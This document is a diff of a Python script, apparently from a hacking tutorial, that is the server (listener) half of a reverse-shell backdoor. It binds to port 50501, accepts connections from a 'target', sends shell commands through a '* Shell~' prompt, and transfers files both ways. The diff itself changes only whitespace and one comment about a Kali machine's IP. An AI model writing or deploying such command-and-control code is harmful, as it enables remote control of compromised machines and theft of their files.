@@ -4,9 +4,11 @@ import socket
 import json
 import os
 
+
 def reliable_send(data):
     jsondata = json.dumps(data)
     target.send(jsondata.encode())
+
 
 def reliable_recv():
     data = ''
@@ -17,9 +19,11 @@ def reliable_recv():
         except ValueError:
             continue
 
+
 def upload_file(file_name):
     f = open(file_name, 'rb')
     target.send(f.read())
+
 
 def download_file(file_name):
     f = open(file_name, 'wb')
@@ -33,6 +37,8 @@ def download_file(file_name):
             break
     target.settimeout(None)
     f.close()
+
+
 def target_communication():
     while True:
         command = input('* Shell~%s: ' % str(ip))
@@ -51,9 +57,10 @@ def target_communication():
             result = reliable_recv()
             print(result)
 
+
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind((''
-           #IP of kali machine
+           #IP of server
            , 50501))
 print('Listening for the incoming connections')
 sock.listen(5)
